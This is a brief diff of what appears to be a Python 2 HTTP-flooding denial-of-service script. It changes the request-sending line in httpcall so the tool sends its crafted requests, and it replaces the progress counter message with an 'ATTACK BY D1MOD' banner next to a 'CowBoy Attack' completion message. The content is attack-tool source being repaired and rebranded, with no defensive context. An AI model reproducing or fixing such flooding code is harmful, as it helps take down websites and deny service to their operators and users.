@@ -460,7 +460,7 @@ def httpcall(url):
 			sys.exit()
 	else:
 			inc_counter()
-			urllib2.urlopen(attack)
+			urllib2.urlopen(request)
 	return(code)		
 
 	
@@ -481,7 +481,7 @@ class MonitorThread(threading.Thread):
 		previous=request_counter
 		while flag==0:
 			if (previous+100<request_counter) & (previous<>request_counter):
-				print "%d Requests Sent" % (request_counter)
+				print "%d ATTACK BY D1MOD" % (request_counter)
 				previous=request_counter
 		if flag==2:
 			print "\n-- CowBoy Attack Fnieshed --"
